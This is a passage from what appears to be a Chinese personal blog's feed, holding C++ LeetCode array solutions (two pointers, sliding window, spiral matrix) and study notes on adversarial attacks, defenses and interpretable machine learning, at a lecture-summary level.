class="hljs-keyword">for</span> (<span class="hljs-type">int</span> fastIndex = <span class="hljs-number">0</span>; fastIndex &lt; nums.<span class="hljs-built_in">size</span>(); fastIndex++) &#123;<br>            <span class="hljs-keyword">if</span> (val != nums[fastIndex]) &#123;<br>                nums[slowIndex++] = nums[fastIndex];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slowIndex;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="相关题目推荐">相关题目推荐</h3><p><ahref="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">26.删除有序数组中的重复项 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() ==  <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> fast = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (fast &lt; nums.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (nums[slow] != nums[fast]) &#123;<br>                slow ++;<br>                nums[slow] = nums[fast];<br>            &#125;<br>            fast ++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> slow + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零 -力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() ==  <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> fast = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (fast &lt; nums.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (nums[slow] != nums[fast]) &#123;<br>                slow ++;<br>                nums[slow] = nums[fast];<br>            &#125;<br>            fast ++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> slow + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/backspace-string-compare/">844.比较含退格的字符串 - 力扣（LeetCode）</a></p><p>一个字符是否会被删掉，只取决于该字符后面的退格符，而与该字符前面的退格符无关。因此当我们逆序地遍历字符串，就可以立即确定当前字符是否会被删掉。</p><p>一个字符是否会被删掉，只取决于该字符后面的退格符，而与该字符前面的退格符无关。因此当我们逆序地遍历字符串，就可以立即确定当前字符是否会被删掉。</p><p>具体地，我们定义skip表示当前待删除的字符的数量。每次我们遍历到一个字符：</p><p>若该字符为退格符，则我们需要多删除一个普通字符，我们让skip加 11；</p><p>若该字符为普通字符：</p><p>若 skip 为 0，则说明当前字符不需要删去；</p><p>若 skip 不为 0，则说明当前字符需要删去，我们让 skip 减 11。</p><p>这样，我们定义两个指针，分别指向两字符串的末尾。每次我们让两指针逆序地遍历两字符串，直到两字符串能够各自确定一个字符，然后将这两个字符进行比较。重复这一过程直到找到的两个字符不相等，或遍历完字符串为止。</p><p>作者：LeetCode-Solution链接：https://leetcode.cn/problems/backspace-string-compare/solution/bi-jiao-han-tui-ge-de-zi-fu-chuan-by-leetcode-solu/来源：力扣（LeetCode）</p><img src="/2022/06/26/Algorithm/algorithm-1/1.gif" class="" title="fig1"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">backspaceCompare</span><span class="hljs-params">(string S, string T)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i = S.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>, j = T.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> skipS = <span class="hljs-number">0</span>, skipT = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> || j &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (S[i] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>                    skipS++, i--;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (skipS &gt; <span class="hljs-number">0</span>) &#123;<br>                    skipS--, i--;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (T[j] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>                    skipT++, j--;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (skipT &gt; <span class="hljs-number">0</span>) &#123;<br>                    skipT--, j--;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &gt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (S[i] != T[j]) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span> || j &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            i--, j--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><ahref="https://leetcode.cn/problems/squares-of-a-sorted-array/">977.有序数组的平方 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sortedSquares</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ans</span><span class="hljs-params">(n)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = n - <span class="hljs-number">1</span>, pos = n - <span class="hljs-number">1</span>; i &lt;= j;) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] * nums[i] &gt; nums[j] * nums[j]) &#123;<br>                ans[pos] = nums[i] * nums[i];<br>                ++i;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                ans[pos] = nums[j] * nums[j];<br>                --j;<br>            &#125;<br>            --pos;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="滑动窗口">滑动窗口</h2><h3 id="长度最小的子数组---力扣leetcode"><ahref="https://leetcode.cn/problems/minimum-size-subarray-sum/">209.长度最小的子数组 - 力扣（LeetCode）</a></h3><h4 id="思路-2">思路</h4><p>所谓滑动窗口，就是不断地调节子序列的起始位置和终止位置，从而得出我们想要的结果。</p><p>在本题内实现滑动窗口，主要确定如下三点：</p><ul><li>窗口内是什么？</li><li>如何移动窗口的起始位置？</li><li>如何移动窗口的结束位置？</li></ul><p>窗口就是 满足其和 ≥ s 的长度最小的 连续 子数组。</p><p>窗口的起始位置如何移动：如果当前窗口的值大于s了，窗口就要向前移动了（也就是该缩小了）。</p><p>窗口的结束位置如何移动：窗口的结束位置就是遍历数组的指针，窗口的起始位置设置为数组的起始位置就可以了。</p><p><strong>滑动窗口的精妙之处在于根据当前子序列和大小的情况，不断调节子序列的起始位置。从而将O(n^2)暴力解法降为O(n)。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minSubArrayLen</span><span class="hljs-params">(<span class="hljs-type">int</span> s, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> result = INT32_MAX;<br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>; <span class="hljs-comment">// 滑动窗口数值之和</span><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-comment">// 滑动窗口起始位置</span><br>        <span class="hljs-type">int</span> subLength = <span class="hljs-number">0</span>; <span class="hljs-comment">// 滑动窗口的长度</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; nums.<span class="hljs-built_in">size</span>(); j++) &#123;<br>            sum += nums[j];<br>            <span class="hljs-comment">// 注意这里使用while，每次更新 i（起始位置），并不断比较子序列是否符合条件</span><br>            <span class="hljs-keyword">while</span> (sum &gt;= s) &#123;<br>                subLength = (j - i + <span class="hljs-number">1</span>); <span class="hljs-comment">// 取子序列的长度</span><br>                result = result &lt; subLength ? result : subLength;<br>                sum -= nums[i ++]; <span class="hljs-comment">// 这里体现出滑动窗口的精髓之处，不断变更i（子序列的起始位置）</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 如果result没有被赋值的话，就返回0，说明没有符合条件的子序列</span><br>        <span class="hljs-keyword">return</span> result == INT32_MAX ? <span class="hljs-number">0</span> : result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="相关题目推荐-1">相关题目推荐</h3><p><a href="https://leetcode.cn/problems/fruit-into-baskets/">904.水果成篮 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">totalFruit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; fruits)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (fruits.<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">return</span> fruits.<span class="hljs-built_in">size</span>();<br>        <br>        <span class="hljs-type">int</span> fr1 = <span class="hljs-number">-1</span>, fr2 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//分别标记当前篮子里的水果种类</span><br>        <span class="hljs-type">int</span> maxNums = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;  <span class="hljs-comment">//滑动窗口起始位置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = j; i &lt; fruits.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-keyword">if</span> (fr1 == <span class="hljs-number">-1</span> || fr1 == fruits[i]) &#123;<br>                fr1 = fruits[i];<br>                <span class="hljs-type">int</span> lens = i - j + <span class="hljs-number">1</span>;<br>                maxNums =  maxNums &gt; lens ? maxNums : lens;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fr2 == <span class="hljs-number">-1</span> || fr2 == fruits[i]) &#123;<br>                <span class="hljs-keyword">if</span> (fr2 == <span class="hljs-number">-1</span>)<br>                    index = i;<br>                fr2 = fruits[i];<br>                <span class="hljs-type">int</span> lens = i - j + <span class="hljs-number">1</span>;<br>                maxNums =  maxNums &gt; lens ? maxNums : lens;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                j  = index;<br>                i = j - <span class="hljs-number">1</span>;<br>                fr1 = <span class="hljs-number">-1</span>;<br>                fr2 = <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> maxNums;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/minimum-window-substring/">76.最小覆盖子串 - 力扣（LeetCode）</a></p><h2 id="螺旋矩阵">螺旋矩阵</h2><h3 id="螺旋矩阵-ii---力扣leetcode"><ahref="https://leetcode.cn/problems/spiral-matrix-ii/">59. 螺旋矩阵 II -力扣（LeetCode）</a></h3><h4 id="思路-3">思路</h4><p><strong>循环不变量原则</strong></p><p>边界条件很多，应当按照固定规则来遍历</p><p>这里一圈下来，我们要画每四条边，这四条边怎么画，每画一条边都要坚持一致的左闭右开，或者左开右闭的原则，这样这一圈才能按照统一的规则画下来。</p><img src="/2022/06/26/Algorithm/algorithm-1/image-20220904124735944.png" class="" title="image-20220904124735944"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generateMatrix</span>(<span class="hljs-type">int</span> n) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">res</span>(n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n, <span class="hljs-number">0</span>)); <span class="hljs-comment">// 使用vector定义一个二维数组</span><br>        <span class="hljs-type">int</span> startx = <span class="hljs-number">0</span>, starty = <span class="hljs-number">0</span>; <span class="hljs-comment">// 定义每循环一个圈的起始位置</span><br>        <span class="hljs-type">int</span> loop = n / <span class="hljs-number">2</span>; <span class="hljs-comment">// 每个圈循环几次，例如n为奇数3，那么loop = 1 只是循环一圈，矩阵中间的值需要单独处理</span><br>        <span class="hljs-type">int</span> mid = n / <span class="hljs-number">2</span>; <span class="hljs-comment">// 矩阵中间的位置，例如：n为3， 中间的位置就是(1，1)，n为5，中间位置为(2, 2)</span><br>        <span class="hljs-type">int</span> count = <span class="hljs-number">1</span>; <span class="hljs-comment">// 用来给矩阵中每一个空格赋值</span><br>        <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>; <span class="hljs-comment">// 需要控制每一条边遍历的长度，每次循环右边界收缩一位</span><br>        <span class="hljs-type">int</span> i,j;<br>        <span class="hljs-keyword">while</span> (loop --) &#123;<br>            i = startx;<br>            j = starty;<br><br>            <span class="hljs-comment">// 下面开始的四个for就是模拟转了一圈</span><br>            <span class="hljs-comment">// 模拟填充上行从左到右(左闭右开)</span><br>            <span class="hljs-keyword">for</span> (j = starty; j &lt; n - offset; j++) &#123;<br>                res[startx][j] = count++;<br>            &#125;<br>            <span class="hljs-comment">// 模拟填充右列从上到下(左闭右开)</span><br>            <span class="hljs-keyword">for</span> (i = startx; i &lt; n - offset; i++) &#123;<br>                res[i][j] = count++;<br>            &#125;<br>            <span class="hljs-comment">// 模拟填充下行从右到左(左闭右开)</span><br>            <span class="hljs-keyword">for</span> (; j &gt; starty; j--) &#123;<br>                res[i][j] = count++;<br>            &#125;<br>            <span class="hljs-comment">// 模拟填充左列从下到上(左闭右开)</span><br>            <span class="hljs-keyword">for</span> (; i &gt; startx; i--) &#123;<br>                res[i][j] = count++;<br>            &#125;<br><br>            <span class="hljs-comment">// 第二圈开始的时候，起始位置要各自加1， 例如：第一圈起始位置是(0, 0)，第二圈起始位置是(1, 1)</span><br>            startx++;<br>            starty++;<br><br>            <span class="hljs-comment">// offset 控制每一圈里每一条边遍历的长度</span><br>            offset += <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果n为奇数的话，需要单独给矩阵最中间的位置赋值</span><br>        <span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span>) &#123;<br>            res[mid][mid] = count;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习进阶(三)</title>
    <link href="/2022/05/04/ML-Advanced/ML-Advanced-3/"/>
    <url>/2022/05/04/ML-Advanced/ML-Advanced-3/</url>
    
    <content type="html"><![CDATA[<h1 id="神经网络压缩">神经网络压缩</h1>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习进阶(二)</title>
    <link href="/2022/05/04/ML-Advanced/ML-Advanced-2/"/>
    <url>/2022/05/04/ML-Advanced/ML-Advanced-2/</url>
    
    <content type="html"><![CDATA[<h1 id="对抗攻击模型">对抗攻击模型</h1><h1 id="attack">Attack</h1><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220504131621955.png" class="" title="image-20220504131621955"><p>Constrain应该根据不同的攻击模型类型来决定，模型是文本，语音还是图像？</p><p>应当选取和人感知相近的constrain。</p><span id="more"></span><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220504131754796.png" class="" title="image-20220504131754796"><h2 id="how-to-attack">How to Attack</h2><p><span class="math display">\[x^{*} = \arg{\min_{d(x^{0}, x^{&#39;} \leq \varepsilon)} L(x^{&#39;})}\]</span></p><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220504133045782.png" class="" title="image-20220504133045782"><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220504133059220.png" class="" title="image-20220504133059220"><h2 id="what-happend">what happend？</h2><p>在下图中的上半部分，tigercat的置信范围是比较宽的，超出置信范围后，也会得到一个类似的结果。</p><p>但在下半部分中，选取一个特定的特征空间，在这个特征空间中，tigercat的范围是十分狭窄的，且超出置信范围后，会得到一个有很大区别的结果。</p><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220505130018534.png" class="" title="image-20220505130018534"><h2 id="attack-approaches">Attack Approaches</h2><table><thead><tr class="header"><th>Name</th><th>website</th></tr></thead><tbody><tr class="odd"><td>FGSM</td><td>https://arxiv.org/abs/1412.6572</td></tr><tr class="even"><td>Basic iterative method</td><td>https://arxiv.org/abs/1607.02533</td></tr><tr class="odd"><td>L-BFGS</td><td>https://arxiv.org/abs/1312.6199</td></tr><tr class="even"><td>Deepfool</td><td>https://arxiv.org/abs/1511.04599</td></tr><tr class="odd"><td>JSMA</td><td>https://arxiv.org/abs/1511.07528</td></tr><tr class="even"><td>C&amp;W</td><td>https://arxiv.org/abs/1608.04644</td></tr><tr class="odd"><td>Elastic net attack</td><td>https://arxiv.org/abs/1709.04114</td></tr><tr class="even"><td>Spatially Transformed</td><td>https://arxiv.org/abs/1801.02612</td></tr><tr class="odd"><td>One Pixel Attack</td><td>https://arxiv.org/abs/1710.08864</td></tr><tr class="even"><td>...... only list a few</td><td></td></tr></tbody></table><p>不同的方法会使用不同的constraints和optimization methods来训练attckmethod。</p><h2 id="black-box-attack">Black Box Attack</h2><p>If you have the training data of the target network</p><ul><li>Train a proxy network yourself</li><li>Using the proxy network to generate attcked objects</li></ul><p>如果没有训练数据，我们可以使用提供的model来得到模型预测的标签，我们便可以运用这些数据来进行attack。</p><p><a href="https://arxiv.org/abs/1610.08401">Universal adversarialperturbations</a></p><h2 id="attack-in-the-real-world">Attack in the Real World</h2><p>Some papers</p><p><a href="https://www.cs.cmu.edu/~sbhagava/pape">人脸识别攻击</a></p><h1 id="defense">Defense</h1><ul><li>Passive defense: Finding the attached image without modifying themodel</li><li>Proactive defense: Training a model that is robust to adversarialattack</li></ul><h2 id="passive-defense">Passive defense</h2><p>攻击生效往往是某一个或某几个维度上的特征，使用filter进行平滑化处理，可以在不大幅度改变原image的情况下，过滤调一些attck特征。</p><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220505133511030.png" class="" title="image-20220505133511030"><p>通过对input的处理，来判断该input是否为attck</p><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220505133652672.png" class="" title="image-20220505133652672"><img src="/2022/05/04/ML-Advanced/ML-Advanced-2/image-20220505133752443.png" class="" title="image-20220505133752443"><h2 id="proactive-defense">Proactive Defense</h2><p>Proactive Defense的主要思想是找出漏洞，补起来。</p><p>在训练模型的时候，找出那些attackinput，给attack正确的标签，再重新进行训练。</p><h1 id="to-learn-more-...">To learn more ...</h1><ul><li>Reference<ul><li>https://adversarial-ml-tutorial.org</li></ul></li><li>Adversarial Attack Toolbox:<ul><li>https://github.com/bethgelab/foolbox</li><li>https://github.com/IBM/adversarial-robustness-toolbox</li><li>https://github.com/tensorflow/cleverhans</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习进阶(一)</title>
    <link href="/2022/03/23/ML-Advanced/ML-Advanced-1/"/>
    <url>/2022/03/23/ML-Advanced/ML-Advanced-1/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习的下一步">机器学习的下一步</h1><p>识别马的深度学习模型，或许学到的不是马的特征，也可能是一些其他的特征，如文件下方的水印。</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220329223448541.png" class="" title="image-20220329223448541"><p>终身学习，机器可不可以像人类一样，可以一直不断地去学习不同的能力，完成不同的任务？</p><p>机器能不能获得自主学习的能力？</p><p>能不能通过很少的数据集来完成一个学习任务？</p><p>增强学习？神经网络压缩？训练资料和测试资料不一样？</p><span id="more"></span><h1 id="可解释的机器学习">可解释的机器学习</h1><p>机器学习解释做了一些什么事情，来提高学习效果，判断学习目标是否正确。</p><h2 id="神奇宝贝数码宝贝">神奇宝贝？数码宝贝？</h2><p>在神奇宝贝和数码宝贝的图片上train一个model，能够分辨出一个图片是神奇宝贝还是数码宝贝。</p><p>但Saliency Map并没有一个好的表现，机器更多在意边缘部分。</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220331225148602.png" class="" title="image-20220331225148602"><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220331225314261.png" class="" title="image-20220331225314261"><h2 id="让机器学习更符合人的预期">让机器学习更符合人的预期</h2><p>参数指标只是机器学习的一个方面，机器生成的东西更应该被人所理解。需要积雪约束来完成这一部分的工作。</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220331230324059.png" class="" title="image-20220331230324059"><h2 id="using-a-model-to-explain-another">Using a model to explainanother</h2><p>通过构建一个可解释的model，来接近一个难解释的model，通过该可解释性model来研究不可解释的model。</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220404225006300.png" class="" title="image-20220404225006300"><h3 id="local-interpertable-model-agnostic-explantionslime">LocalInterpertable Model-Agnostic Explantions(LIME)</h3><p>在一定的区域可以用一个可解释的模型去拟合未知的模型。</p><p>需要选择一个合理的<strong>附近</strong>区域。</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220404225151129.png" class="" title="image-20220404225151129"><h3 id="devision-tree">Devision Tree</h3><p><span class="math inline">\(\theta\)</span>为黑盒的参数，<spanclass="math inline">\(T_\theta\)</span>为Decision Tree的参数</p><p><span class="math inline">\(O(T_{\theta})\)</span>: how complex <spanclass="math inline">\(T_{\theta}\)</span> is</p><img src="/2022/03/23/ML-Advanced/ML-Advanced-1/image-20220410192259418.png" class="" title="image-20220410192259418"><ul><li>Train a network that is easy to be interpreted by decision tree.<span class="math display">\[\theta^{*} = argmin(L(\theta)) + \lambda O(T_{\theta})\]</span> 通过另外一个network来求得这个<spanclass="math inline">\(O(T_{\theta})\)</span></li></ul>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CMake-2</title>
    <link href="/2022/03/13/CMake/CMake-2/"/>
    <url>/2022/03/13/CMake/CMake-2/</url>
    
